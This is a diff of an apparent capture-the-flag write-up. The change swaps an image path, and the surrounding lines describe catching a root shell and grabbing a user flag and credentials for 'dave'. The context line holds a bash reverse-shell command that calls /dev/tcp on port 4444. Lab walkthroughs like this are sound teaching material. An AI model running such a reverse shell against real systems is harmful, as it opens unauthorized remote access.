@@ -167,7 +167,7 @@ up "/bin/bash -c 'bash -i >& /dev/tcp/192.168.122.1/4444 0>&1'"
 
 Take note that we have to use the IP address **of the machine** and not our own. With the SSH access we have, we can open a listener port and catch a root shell:
 
-<figure><img src="../../../.gitbook/assets/image (5) (2) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>
 
 Here, we can grab the user flag from `/home/dave`. Then we can find more credentials for `dave` on this machine:
 
